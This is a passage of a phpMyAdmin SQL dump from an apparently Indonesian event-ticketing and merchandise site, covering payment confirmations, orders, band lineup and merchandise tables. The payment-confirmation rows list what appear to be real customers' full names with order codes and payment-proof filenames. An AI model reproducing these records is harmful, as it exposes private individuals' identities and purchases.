-- phpMyAdmin SQL Dump
-- version 4.9.4
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Waktu pembuatan: 15 Mar 2020 pada 15.12
-- Versi server: 5.7.28
-- Versi PHP: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `bigtels_andi`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `confirm_merch`
--

CREATE TABLE `confirm_merch` (
  `id_confirm_merch` int(11) NOT NULL,
  `id_users` int(11) NOT NULL,
  `id_merch` int(11) NOT NULL,
  `id_ordermerch` varchar(255) NOT NULL,
  `pengirim_confirm` text NOT NULL,
  `bukti_confirm` text NOT NULL,
  `status_confirm` enum('valid','invalid','uncheck','') NOT NULL DEFAULT 'uncheck',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `confirm_merch`
--

INSERT INTO `confirm_merch` (`id_confirm_merch`, `id_users`, `id_merch`, `id_ordermerch`, `pengirim_confirm`, `bukti_confirm`, `status_confirm`, `created_at`, `updated_at`) VALUES
(30, 259, 20, 'rh4NrSEY449KtSY29CuFU90N61', 'hanif tes - COD', '259__2020-01-06 23:39:48.png', 'uncheck', '2020-01-06 17:39:48', '2020-01-06 17:39:48'),
(31, 271, 20, 'JW3ahjdumv5mQLu7rcfiD5qJC2', 'rakha fahrizi - COD', '271__2020-01-09 08:12:41.jpg', 'valid', '2020-01-09 02:12:41', '2020-01-12 11:41:48'),
(29, 259, 15, 'eh7zOVAmrEFDFbMcgH3yVuiGkn', 'tester', '259_tester_2020-01-06 23:32:40.png', 'uncheck', '2020-01-06 17:32:40', '2020-01-06 17:32:40'),
(28, 259, 15, 'oy36haJvaH4ss1VgF5ha01BDp9', 'hanif tes - COD', '259__2020-01-06 23:32:15.png', 'invalid', '2020-01-06 17:32:15', '2020-01-12 11:42:01');

-- --------------------------------------------------------

--
-- Struktur dari tabel `confirm_payment`
--

CREATE TABLE `confirm_payment` (
  `id_confirm` int(11) NOT NULL,
  `id_users` int(11) NOT NULL,
  `id_ticket` int(11) NOT NULL,
  `id_orderticket` varchar(255) NOT NULL,
  `pengirim_confirm` text NOT NULL,
  `bukti_confirm` text NOT NULL,
  `status_confirm` enum('valid','invalid','uncheck','') NOT NULL DEFAULT 'uncheck',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `confirm_payment`
--

INSERT INTO `confirm_payment` (`id_confirm`, `id_users`, `id_ticket`, `id_orderticket`, `pengirim_confirm`, `bukti_confirm`, `status_confirm`, `created_at`, `updated_at`) VALUES
(144, 255, 3, 'pTZrA7Gdbv35YoJ4oHImJOlNty', 'an.masruroh', '255_an.masruroh_2020-01-06 18:10:05.jpeg', 'valid', '2020-01-06 12:10:06', '2020-01-06 16:28:37'),
(145, 256, 3, 'CCVCJtfU27Vlpkjst2RXgJUXNG', 'Muhammad Frizki Alfian', '256_Muhammad Frizki Alfian_2020-01-07 09:49:19.jpg', 'valid', '2020-01-07 03:49:19', '2020-01-07 14:59:44'),
(140, 48, 2, '6nOJfU9JJyw0oXbl4p0Bw9aw8t', 'Diana Etikawati', '48_Diana Etikawati_2019-12-01 09:06:41.png', 'valid', '2019-12-01 03:06:41', '2019-12-01 03:46:21'),
(146, 257, 3, 'X2z1vsPbhKgWxoXonlfVi4gWZM', 'Pandji Danang P', '257_Pandji Danang P_2020-01-07 13:36:09.jpg', 'valid', '2020-01-07 07:36:09', '2020-01-07 14:59:35'),
(143, 238, 2, 'F6b92L3HWYVM99MuhP25TvnGcJ', 'Fitri yani', '238_Fitri yani_2019-12-02 21:20:12.jpg', 'invalid', '2019-12-02 15:20:12', '2019-12-08 13:53:51'),
(122, 217, 2, '0Z558Xw39NJySHj9jslW1zvfWK', 'Muhammad faris', '217_Muhammad faris_2019-11-29 23:55:37.png', 'valid', '2019-11-29 17:55:37', '2019-11-29 18:16:00'),
(127, 217, 2, 'U06IjANOLmFECZiCvgAm25hq6Z', 'Muhammad faris zarfhan', '217_Muhammad faris zarfhan_2019-11-30 11:10:39.png', 'invalid', '2019-11-30 05:10:39', '2019-11-30 10:27:11'),
(119, 212, 2, 'r5N8BU5nU3eVpnCyZ6hfjYqtPU', 'Retno ayu puspita', '212_Retno ayu puspita_2019-11-29 22:11:59.png', 'valid', '2019-11-29 16:11:59', '2019-11-29 16:20:50'),
(120, 214, 2, '6csvVzhR1RtnduPveeOpWTKr8y', 'Agus Suparyanto', '214_Agus Suparyanto_2019-11-29 23:29:07.jpg', 'valid', '2019-11-29 17:29:07', '2019-11-29 17:31:56'),
(121, 216, 2, 'EGjaSIlmMR2d6P4D2zpmuGGdSS', 'arya dwi putra - COD', '216__2019-11-29 23:47:23.jpeg', 'invalid', '2019-11-29 17:47:23', '2019-12-14 13:18:22'),
(117, 205, 2, '2G9tQBbNneq9aI3FIde13w6ePs', 'dendi gans', '205_dendi gans_2019-11-29 21:49:20.jpeg', 'valid', '2019-11-29 15:49:20', '2019-11-29 15:51:36'),
(118, 211, 2, 'ltNDJebGzYXJRGi1I3u886bR8M', 'Aditya Yusup Ramadjan', '211_Aditya Yusup Ramadjan_2019-11-29 22:11:03.jpg', 'valid', '2019-11-29 16:11:03', '2019-11-29 16:19:20'),
(114, 203, 2, '8VQi0AoO0uweU7GGy5cBi1abRQ', 'dendi ramadhan - COD', '203__2019-11-29 20:59:14.jpeg', 'valid', '2019-11-29 14:59:14', '2019-11-29 15:09:55'),
(115, 201, 2, 'X4Ae4OKsC2n5KaHfm9gJ1kwh2A', 'kartika wulandhari - COD', '201__2019-11-29 21:00:33.jpg', 'valid', '2019-11-29 15:00:33', '2019-11-29 15:19:05'),
(126, 220, 2, '6j1l7DCWYqqMBgmVSA7iLohutM', 'Achmad Oktamar - COD', '220__2019-11-30 10:57:36.jpg', 'valid', '2019-11-30 04:57:36', '2019-11-30 10:26:35'),
(141, 231, 2, 'eJVBP7Y2VT5kjBRYBLFgSZMQAT', 'Sri Fajaryati - COD', '231__2019-12-01 14:08:41.jpg', 'invalid', '2019-12-01 08:08:41', '2019-12-14 13:18:06'),
(113, 194, 2, 'oXFNgtwIxSUED2omxhDWzkv15P', 'Bayu aji pangestu - COD', '194__2019-11-29 20:13:41.jpg', 'valid', '2019-11-29 14:13:41', '2019-11-29 14:18:39'),
(109, 186, 2, 'KyRO4sl76BFuMmkSds2fMEZXXB', 'Nova Isna Ananda', '186_Nova Isna Ananda_2019-11-29 17:45:37.jpg', 'invalid', '2019-11-29 11:45:37', '2019-12-15 14:49:35'),
(110, 190, 2, 'TG3uVXeLSTOkZS3urAitpNbmJZ', 'TOKO RIZKY', '190_TOKO RIZKY_2019-11-29 18:40:59.jpg', 'valid', '2019-11-29 12:40:59', '2019-11-29 12:53:42'),
(107, 183, 2, 'RC5OwTNnhMoutFNO70Xfc2mEOP', 'Hadyan Isyraq Albajili', '183_Hadyan Isyraq Albajili_2019-11-29 17:30:28.jpg', 'invalid', '2019-11-29 11:30:28', '2019-12-10 16:31:24'),
(108, 151, 2, 'jisDcKHsDFd2Mj1VoQhDIxmhsS', 'Najwa', '151_Najwa_2019-11-29 17:43:08.jpg', 'valid', '2019-11-29 11:43:08', '2019-11-29 12:54:34'),
(97, 143, 2, 'E0eHSjzbKhLEcDzlZGMHNL92wf', 'Shepira', '143_Shepira_2019-11-29 13:07:33.jpg', 'invalid', '2019-11-29 07:07:33', '2019-12-16 14:35:06'),
(106, 174, 2, '3qiDql1xbdp2WFdc37wuQWJ6QW', 'BOWO PRASMONO', '174_BOWO PRASMONO_2019-11-29 17:17:49.jpg', 'valid', '2019-11-29 11:17:49', '2019-11-29 11:17:49'),
(99, 154, 2, '9CFtmtEfRpI64jnwJE9wKHNrmX', 'Khamelia Difa - COD', '154__2019-11-29 13:52:15.jpeg', 'invalid', '2019-11-29 07:52:15', '2019-12-14 13:56:07'),
(95, 147, 2, 'JXatOX2cADfV8kJHgbIwcb0DCc', 'Rivaldo Rafi Azhim', '147_Rivaldo Rafi Azhim_2019-11-29 13:06:48.jpg', 'invalid', '2019-11-29 07:06:48', '2019-12-15 15:06:54'),
(96, 132, 2, 'agJ2GQT5Cg5PQeEfiDtHq4fy1Y', 'ANANDA ICHLAS AKBARI', '132_ANANDA ICHLAS AKBARI_2019-11-29 13:07:10.png', 'invalid', '2019-11-29 07:07:10', '2019-12-08 14:20:51'),
(92, 114, 2, 'K5Xf2pFS84X3V9Ed4n4sM5I78H', 'Calvin huang', '114_Calvin huang_2019-11-29 11:24:38.jpg', 'valid', '2019-11-29 05:24:38', '2019-11-29 11:30:09'),
(93, 121, 2, 'RFU0P53Bbmbg5H6KzHwt02wjPO', 'GEDE KHARISMA IRAWAN', '121_GEDE KHARISMA IRAWAN_2019-11-29 11:50:12.jpg', 'invalid', '2019-11-29 05:50:12', '2019-12-10 16:14:46'),
(94, 142, 2, 'enqTe0f8Nv5unPIgFRAE1Y9OWP', 'MUHAMMAD SHAHIZIDAN FADAR', '142_MUHAMMAD SHAHIZIDAN FADAR_2019-11-29 12:38:32.jpg', 'valid', '2019-11-29 06:38:32', '2019-11-29 11:27:10'),
(90, 111, 2, '0oKSeTOy2Ecm6ZY3i8cwmyraxU', 'Muhammad Ibnu Bahi', '111_Muhammad Ibnu Bahi_2019-11-29 10:35:41.jpg', 'invalid', '2019-11-29 04:35:41', '2019-12-11 16:06:04'),
(91, 108, 2, '9A9VncfUGO2o3tAs6ILu06JFu3', 'Rhamadani putra herdiansyah', '108_Rhamadani putra herdiansyah_2019-11-29 10:45:44.jpg', 'invalid', '2019-11-29 04:45:44', '2019-12-08 15:37:41'),
(88, 93, 2, 'dAmR8lBJ4sW4YrkVrFOIPXkxck', 'Raditya Ariyanto', '93_Raditya Ariyanto_2019-11-29 10:22:23.png', 'invalid', '2019-11-29 04:22:23', '2019-12-11 16:04:30'),
(89, 52, 2, 'X0uEBjWxOzxyuSzc1eedJI6biC', 'Ahmad rojali', '52_Ahmad rojali_2019-11-29 10:23:33.jpg', 'invalid', '2019-11-29 04:23:33', '2019-12-11 16:20:21'),
(85, 98, 2, 'gvRZ75Ql9TuC2ealrxorUbUyKO', '123', '98_123_2019-11-29 10:07:42.jpg', 'invalid', '2019-11-29 04:07:42', '2019-11-29 04:10:46'),
(86, 98, 2, 'gvRZ75Ql9TuC2ealrxorUbUyKO', 'Atas Nama', '98_Atas Nama_2019-11-29 10:10:08.jpg', 'invalid', '2019-11-29 04:10:08', '2019-11-29 04:11:02'),
(87, 98, 2, 'vIjV8eXLIwbUP3Tevruuqb4Maq', 'TEST PAYMENT DONT ACC', '98_TEST PAYMENT DONT ACC_2019-11-29 10:14:53.jpg', 'invalid', '2019-11-29 04:14:53', '2019-11-29 08:06:14'),
(82, 96, 2, 'hA8sxLIKirr3z6X5p7TJvtsriZ', 'Eka Sapta', '96_Eka Sapta_2019-11-29 09:54:12.png', 'invalid', '2019-11-29 03:54:12', '2019-12-11 16:21:45'),
(83, 79, 2, 'T7RxGFASrXl8EA0Xhw93z047kZ', 'Boedi Tegoeh', '79_Boedi Tegoeh_2019-11-29 10:02:48.jpg', 'invalid', '2019-11-29 04:02:48', '2019-12-15 14:54:28'),
(84, 66, 2, 'GRh92ElCc0HDu6ACeh4UW8lq4W', 'RISKA AMALIA', '66_RISKA AMALIA_2019-11-29 10:06:47.jpg', 'invalid', '2019-11-29 04:06:47', '2019-12-08 14:06:21'),
(80, 94, 2, 'kHvDIrZrMF6hsjducWJC4MuQtn', 'Hendranata - COD', '94__2019-11-29 09:47:55.jpg', 'invalid', '2019-11-29 03:47:55', '2019-11-29 08:55:13'),
(81, 97, 2, 'R4ro0fl2cjcJbhCROigoP6N4dG', 'Nabilla Dwi Rahayu', '97_Nabilla Dwi Rahayu_2019-11-29 09:52:45.png', 'valid', '2019-11-29 03:52:45', '2019-11-29 08:56:25'),
(78, 41, 2, '4lR6gTH4lUqFVuOrBF009mUJqC', 'ARY RACHMAN PRABOWO', '41_ARY RACHMAN PRABOWO_2019-11-29 09:28:33.jpeg', 'invalid', '2019-11-29 03:28:33', '2019-12-10 16:37:48'),
(79, 89, 2, 'C5UaR1VoyFgKHXHuMj0vMuwM0W', 'Ninda kurnia putri', '89_Ninda kurnia putri_2019-11-29 09:44:02.jpg', 'invalid', '2019-11-29 03:44:02', '2019-11-29 17:35:55'),
(111, 191, 2, 'GcLVx5NPj8W8hD9rTCsWkcA1xF', 'Agustinus Wahyu Hertantio', '191_Agustinus Wahyu Hertantio_2019-11-29 19:06:22.jpg', 'invalid', '2019-11-29 13:06:23', '2019-12-15 14:53:26'),
(105, 178, 2, 'hOahDY9Yk4hAR6eVJx6AcTgY3v', 'E. Rusman', '178_E. Rusman_2019-11-29 17:01:57.jpg', 'invalid', '2019-11-29 11:01:57', '2019-12-10 16:32:08'),
(76, 82, 2, 'CXS7BNIRDX1r0vuQRHkuhMMnCd', 'Ichart Raihant', '82_Ichart Raihant_2019-11-29 09:25:46.png', 'invalid', '2019-11-29 03:25:46', '2019-11-29 03:30:26'),
(77, 82, 2, 'CXS7BNIRDX1r0vuQRHkuhMMnCd', 'Ichart Raihant 2', '82_Ichart Raihant 2_2019-11-29 09:26:24.png', 'invalid', '2019-11-29 03:26:24', '2019-11-29 03:30:24'),
(101, 162, 2, 'VJVpTfHnhnSBJf5jIohAPFFea9', 'yohana tri puspita', '162_yohana tri puspita_2019-11-29 14:57:05.jpg', 'invalid', '2019-11-29 08:57:05', '2019-12-11 16:18:42'),
(73, 74, 2, '06stVBAtdPR35EcTs94sgMkdrz', 'Rhamadani putra H', '74_Rhamadani putra H_2019-11-29 09:17:54.jpeg', 'invalid', '2019-11-29 03:17:54', '2019-12-08 15:37:21'),
(103, 174, 2, 'wn1Wcp7KOQsRYeCTUzJ5QdH29o', 'Bowo prasmono', '174_Bowo prasmono_2019-11-29 16:50:53.jpg', 'invalid', '2019-11-29 10:50:53', '2019-11-30 04:02:01'),
(71, 45, 2, 'u9s3hvghRdzG5c8aZYtKrNDjcB', 'Rhamadani putra H', '45_Rhamadani putra H_2019-11-29 09:04:57.jpg', 'invalid', '2019-11-29 03:04:57', '2019-12-08 14:00:26'),
(69, 69, 2, 'khgrkSu80EVMdi2sfLHyWQEjE8', 'a.n Icksanto Desta Yuda Ramadani', '69_a.n Icksanto Desta Yuda Ramadani_2019-11-29 09:02:05.jpg', 'valid', '2019-11-29 03:02:05', '2019-11-29 03:15:11'),
(59, 39, 1, '2v4jV17CsYAkhoQ8MeaLF8IKUw', 'Arya Gans - COD', '39__2019-11-26 20:21:52.jpg', 'invalid', '2019-11-26 14:21:52', '2020-01-15 08:21:59'),
(61, 38, 1, 'GEtkRckvV3WkhdFl8tVW1DR1gh', 'Panjul (revaldo)', '38_Panjul (revaldo)_2019-11-26 20:50:34.jpeg', 'invalid', '2019-11-26 14:50:34', '2019-12-15 16:34:39'),
(125, 36, 2, 'OJIulAGUR1jCKqkK1YHwQ48o65', 'Riyon Aryono - COD', '36__2019-11-30 10:17:13.jpg', 'invalid', '2019-11-30 04:17:13', '2019-12-15 15:14:32'),
(66, 66, 2, 'EQ19Ih1Wp1CjKm91WArpknNtp7', 'RISKA AMALIA', '66_RISKA AMALIA_2019-11-29 08:36:49.jpg', 'invalid', '2019-11-29 02:36:49', '2019-12-08 14:06:28'),
(68, 72, 2, 'qXsWKV4pr5Wok8jZ2vVibQg16Z', 'Arasya salshabila', '72_Arasya salshabila_2019-11-29 09:00:07.jpg', 'valid', '2019-11-29 03:00:07', '2019-11-29 03:14:30'),
(55, 35, 1, 'Hm2FvdlWvMa9hCw5DchAIwnnWr', 'Santika kusuma Wardhani', '35_Santika kusuma Wardhani_2019-11-26 11:33:54.jpg', 'invalid', '2019-11-26 05:33:54', '2019-12-15 14:56:54'),
(142, 232, 2, 'aDUIl3LuCfnxUFo1YdqtDvuR1C', 'Fransiska Xaveria Gratia', '232_Fransiska Xaveria Gratia_2019-12-01 14:35:06.png', 'invalid', '2019-12-01 08:35:06', '2019-12-08 13:55:57'),
(139, 227, 2, 'aKPxZhNgmuIkHqLeYE9egv8VNM', 'Amalia Latri Pritiandini', '227_Amalia Latri Pritiandini_2019-12-01 00:52:02.png', 'invalid', '2019-11-30 18:52:02', '2019-12-15 16:39:00'),
(138, 226, 2, 'cFZew3ITmPZwTV2RGoZFATKVdy', 'Milati Shofa', '226_Milati Shofa_2019-11-30 23:55:15.jpg', 'invalid', '2019-11-30 17:55:15', '2019-12-15 15:03:08'),
(148, 262, 3, 'N5Pa8yZR8s61pQTEIrlhMXV2Jm', 'Alliffiyola Lani Putri', '262_Alliffiyola Lani Putri_2020-01-07 17:12:06.jpg', 'valid', '2020-01-07 11:12:06', '2020-01-07 14:59:30'),
(149, 264, 3, 'jCR3RPxZs5gM8i0PaONCQGJMno', 'Toko Rizky', '264_Toko Rizky_2020-01-07 19:58:20.jpg', 'valid', '2020-01-07 13:58:20', '2020-01-07 14:59:21'),
(150, 270, 3, 'gufEPUXRNpJhdjFJAgmKzlqkCT', 'Aghnial Saiful Adli - COD', '270__2020-01-08 10:42:42.jpg', 'valid', '2020-01-08 04:42:42', '2020-01-09 07:59:00'),
(151, 269, 3, 'bKmmydAXYhoNubWHO96mdUX26Z', 'Indra Wijaya Kurniawan', '269_Indra Wijaya Kurniawan_2020-01-08 12:31:49.jpg', 'valid', '2020-01-08 06:31:49', '2020-01-09 08:11:47'),
(152, 251, 3, 'UzFWE9IOTZCVtyZCjD5oPUs1LN', 'Bimo', '251_Bimo_2020-01-08 16:43:04.jpg', 'valid', '2020-01-08 10:43:04', '2020-01-08 10:46:13'),
(153, 181, 3, 'LPqW7oyUeF74xen7hkYTaYcVD9', 'Hardyansyah Wahyu Arif - COD', '181__2020-01-08 23:03:06.jpeg', 'valid', '2020-01-08 17:03:06', '2020-01-09 08:02:08'),
(154, 275, 3, '1SOVpK1rSP1pc878GW5BTM9upo', 'Sari gumbira', '275_Sari gumbira_2020-01-10 14:12:22.jpg', 'valid', '2020-01-10 08:12:22', '2020-01-12 11:43:36'),
(155, 267, 3, 'A4h0MV313vFCDwTJ5wnV5LKL1g', 'ridho hisyam - COD', '267__2020-01-12 13:14:59.jpg', 'valid', '2020-01-12 07:14:59', '2020-01-12 11:42:13'),
(156, 272, 3, '5fp9OJ9U6sMeCwAy7dysmXMii2', 'Rafi Hibatullah - COD', '272__2020-01-12 20:16:32.jpg', 'valid', '2020-01-12 14:16:32', '2020-01-15 07:04:33'),
(157, 58, 3, 'xQCu4I8qQhvSBQdZ5lNZP8Dnuz', 'Bintang Mahar Putra - COD', '58__2020-01-12 20:20:09.jpg', 'valid', '2020-01-12 14:20:09', '2020-01-15 07:03:52'),
(158, 277, 3, 'hvU2oOh8eYp0tBrlS5wIn5hGMl', 'Ahmad Jafar Sadiq - COD', '277__2020-01-14 10:55:16.jpg', 'valid', '2020-01-14 04:55:16', '2020-01-15 06:53:13'),
(159, 267, 3, 'HENNLjiiFZAw67zuIjdtsOjmIX', 'ridho hisyam - COD', '267__2020-01-14 23:15:24.jpeg', 'valid', '2020-01-14 17:15:24', '2020-01-15 06:55:19'),
(164, 237, 2, 'Eg0bWipxjgBmpm2dzVpMQbOAmB', 'Sri wahyuni - COD', '237__2020-01-16 14:12:05.jpg', 'valid', '2020-01-16 08:12:05', '2020-01-16 08:14:12'),
(161, 280, 3, 'wiSYdGbfeMuyqtd0hVe0OEXCIj', 'AditiyaSaputra - COD', '280__2020-01-15 14:02:55.jpg', 'valid', '2020-01-15 08:02:55', '2020-01-15 09:58:35'),
(162, 166, 3, 'rzGNKmNKhop4LqgTiZZxWP9GE0', 'Muhammad Syahid Mu\'afa - COD', '166__2020-01-15 16:32:43.jpg', 'valid', '2020-01-15 10:32:43', '2020-01-15 10:33:10'),
(163, 281, 3, 'w368x2bjSbVy4lYpJ1Me3Kgu18', 'Alfarizi', '281_Alfarizi_2020-01-15 20:02:40.jpg', 'valid', '2020-01-15 14:02:40', '2020-01-17 07:56:07'),
(165, 240, 2, 'xsxnTfZ9eDSe3ctMPHmazMvLlC', 'Sri wahyuni - COD', '240__2020-01-16 14:13:54.jpg', 'valid', '2020-01-16 08:13:54', '2020-01-16 08:15:10'),
(166, 282, 3, '83zTtCjZ2otgl388txyb8dGpyg', 'Margareth Sitanggang - COD', '282__2020-01-16 14:53:05.jpg', 'valid', '2020-01-16 08:53:05', '2020-01-16 08:53:19'),
(167, 282, 3, 'DlDwCRJYeVmLy9HQYWe3mHXstw', 'Margareth Sitanggang - COD', '282__2020-01-16 14:57:03.jpg', 'valid', '2020-01-16 08:57:03', '2020-01-16 08:57:34'),
(168, 285, 3, 'aSHajBjob8ODLcSQAmT2PcTL4c', 'Fikri', '285_Fikri_2020-01-17 22:37:02.jpg', 'valid', '2020-01-17 16:37:02', '2020-01-18 06:47:05'),
(169, 291, 3, 'cZhF3YryeesVNfzAJpB0Bd1jzZ', 'Rido Krisna', '291_Rido Krisna_2020-01-19 01:35:14.jpeg', 'valid', '2020-01-18 19:35:14', '2020-01-19 01:46:22'),
(170, 290, 3, 'OXApfPFmtBBfPotJgOumV4PYuQ', 'Ridho krisna', '290_Ridho krisna_2020-01-19 01:35:45.jpg', 'valid', '2020-01-18 19:35:45', '2020-01-19 01:46:20');

-- --------------------------------------------------------

--
-- Struktur dari tabel `lineup`
--

CREATE TABLE `lineup` (
  `id_line` int(11) NOT NULL,
  `nama` varchar(255) NOT NULL,
  `foto` text NOT NULL,
  `deskripsi` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `lineup`
--

INSERT INTO `lineup` (`id_line`, `nama`, `foto`, `deskripsi`) VALUES
(2, 'The Upstairs', '1576910934.png', 'Indonesian band that was formed on October 5, 2001. The Upstairs is also known for their frontman charisma, Jimi \"Danger\" Multhazim who is extrensic and clever when he is on stage, this band is also often called \"King of Pensi\" in Jabodetabek'),
(3, 'Reality Club', '1578323910.png', 'This is our 2nd guest! @realityclub will enliven our event later on January 19, 2020 with a song that hits \" is it the answer \", see you in the wild later!\r\n\r\nTake an indie-rock band and inject it with a firm attitude and catchy phrases, that\'s Reality Club for you.'),
(4, 'Pedangdut Milenial', '1579062825.png', '.');

-- --------------------------------------------------------

--
-- Struktur dari tabel `merch`
--

CREATE TABLE `merch` (
  `id_merch` int(11) NOT NULL,
  `nama_merch` text NOT NULL,
  `harga_merch` int(11) NOT NULL,
  `foto_merch` text NOT NULL,
  `kategori_merch` varchar(255) NOT NULL,
  `desc_merch` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `merch`
--

INSERT INTO `merch` (`id_merch`, `nama_merch`, `harga_merch`, `foto_merch`, `kategori_merch`, `desc_merch`) VALUES
(15, 'T-Shirt', 75000, '1578207443.png', 'BAJU', '<p>Cotten comed 30s<br />\r\nSize Chart<br />\r\nS : Lebar : 49 // Panjang : 69<br />\r\nM : Lebar : 50 // Panjang : 70<br />\r\nL : Lebar : 53 // Panjang : 74<br />\r\nXL : Lebar : 55 // Panjang : 76<br />\r\nXXL : Lebar : 57 // Panjang : 78</p>\r\n\r\n<p>Sablon Discharge</p>'),
(20, 'Totebag', 40000, '1578324092.jpg', 'TOTEBAG', '<p>Canvas</p>\r\n\r\n<p>Size 30x40</p>\r\n\r\n<p>Sablon Discharge</p>'),
(21, 'Stainless Steel', 35000, '1578324597.jpg', 'SEDOTAN', '<p>.</p>'),
(22, 'Kipas', 10000, '1578324610.png', 'KIPAS', '<p>.</p>');

-- --------------------------------------------------------

--
-- Struktur dari tabel `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data untuk tabel `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1);

-- --------------------------------------------------------

--
-- Struktur dari tabel `ordermerch`
--

CREATE TABLE `ordermerch` (
  `id_ordermerch` varchar(255) NOT NULL,
  `id_users` int(11) NOT NULL,
  `id_merch` int(11) NOT NULL,
  `jumlah_ordermerch` int(11) NOT NULL,
  `ukuran_ordermerch` varchar(255) NOT NULL DEFAULT ' ',
  `kode_ordermerch` int(11) NOT NULL,
  `die_ordermerch` timestamp NULL DEFAULT NULL,
  `tgl_ordermerch` date NOT NULL,
  `status_ordermerch` tinyint(1) NOT NULL,
  `used_ordermerch` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `ordermerch`
--

INSERT INTO `ordermerch` (`id_ordermerch`, `id_users`, `id_merch`, `jumlah_ordermerch`, `ukuran_ordermerch`, `kode_ordermerch`, `die_ordermerch`, `tgl_ordermerch`, `status_ordermerch`, `used_ordermerch`, `created_at`, `updated_at`) VALUES
('0lYlqA0dKUJgnhDiR4eNjvv60K', 289, 15, 1, 'S', 1, '2020-01-18 11:56:04', '2020-01-18', 3, 0, '2020-01-18 10:56:04', '2020-01-18 10:56:04'),
('1XWSwWs6ZP4sjPEZZVWcZGfH1Y', 259, 15, 1, 'XXL', 871, '2020-01-06 18:20:37', '2020-01-06', 3, 0, '2020-01-06 17:20:37', '2020-01-06 17:20:37'),
('2G6pjVGgusrFXMUzHoCh9H2gBQ', 259, 15, 1, 'S', 8, '2020-01-06 18:44:46', '2020-01-06', 3, 0, '2020-01-06 17:44:46', '2020-01-06 17:44:46'),
('2hbGqlBZcb8fv5CddiObRBnFMC', 51, 12, 1, 'S', 84, '2019-11-28 11:43:06', '2019-11-28', 3, 0, '2019-11-28 10:43:06', '2019-11-28 10:43:06'),
('eh7zOVAmrEFDFbMcgH3yVuiGkn', 259, 15, 1, 'XL', 235, '2020-01-06 18:32:30', '2020-01-06', 3, 0, '2020-01-06 17:32:30', '2020-01-06 17:32:30'),
('esSNtd7X3EKVwmKdmoqCCBgxZ0', 51, 8, 1, ' ', 741, '2019-11-28 11:45:01', '2019-11-28', 1, 0, '2019-11-28 10:45:01', '2019-11-28 11:07:00'),
('gA4N6lzABX9FAKotCfl72MkRYe', 51, 7, 1, 'S', 159, '2019-11-28 10:37:16', '2019-11-28', 3, 0, '2019-11-28 10:37:16', '2019-11-28 10:37:16'),
('IUptRrOEkhhKUaZb3OCGZPVA7f', 51, 13, 1, 'S', 459, '2019-11-28 11:43:18', '2019-11-28', 2, 0, '2019-11-28 10:43:18', '2019-11-28 10:43:32'),
('JW3ahjdumv5mQLu7rcfiD5qJC2', 271, 20, 1, ' ', 589, '2020-01-09 03:12:10', '2020-01-09', 1, 0, '2020-01-09 02:12:10', '2020-01-12 11:41:48'),
('Lf2GGBSCoXdh0vLvM4VbE6voY6', 37, 15, 1, 'L', 196, '2020-01-07 01:59:35', '2020-01-07', 3, 0, '2020-01-07 00:59:35', '2020-01-07 00:59:35'),
('OPOeAdEO6HVOmpNCjiFXNat7xq', 51, 7, 1, 'S', 245, '2019-11-28 04:40:08', '2019-11-28', 1, 0, '2019-11-28 03:40:08', '2019-11-28 10:51:48'),
('oy36haJvaH4ss1VgF5ha01BDp9', 259, 15, 1, 'XXL', 872, '2020-01-06 18:27:25', '2020-01-06', 2, 1, '2020-01-06 17:27:25', '2020-01-12 11:42:01'),
('qLqz40WAc8tmHB5Z85JrUK47fK', 259, 15, 1, 'XL', 141, '2020-01-06 18:19:46', '2020-01-06', 3, 0, '2020-01-06 17:19:46', '2020-01-06 17:19:46'),
('rh4NrSEY449KtSY29CuFU90N61', 259, 20, 1, ' ', 130, '2020-01-06 18:39:32', '2020-01-06', 3, 0, '2020-01-06 17:39:32', '2020-01-06 17:39:32'),
('SBlYq4JFgVMTsgnwwaxv7gbe6q', 51, 9, 1, ' ', 432, '2019-11-28 11:43:54', '2019-11-28', 1, 0, '2019-11-28 10:43:54', '2019-11-28 10:44:25'),
('SoFhbmn3vPvKWtRG8B0EoUFF3k', 36, 15, 1, 'S', 201, '2020-02-06 09:24:38', '2020-02-06', 0, 0, '2020-02-06 08:24:38', '2020-02-06 08:24:38'),
('zHpID4hsFvJCrTpYfTHFyuu8hK', 260, 15, 1, 'XXL', 683, '2020-01-06 19:24:04', '2020-01-07', 3, 0, '2020-01-06 18:24:04', '2020-01-06 18:24:04');

-- --------------------------------------------------------

--
-- Struktur dari tabel `orderticket`
--

CREATE TABLE `orderticket` (
  `id_orderticket` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `id_users` int(11) NOT NULL,
  `id_ticket` int(11) NOT NULL,
  `jumlah_orderticket` int(11) NOT NULL,
  `kode_orderticket` int(11) NOT NULL,
  `die_orderticket` timestamp NULL DEFAULT NULL,
  `tgl_orderticket` date NOT NULL,
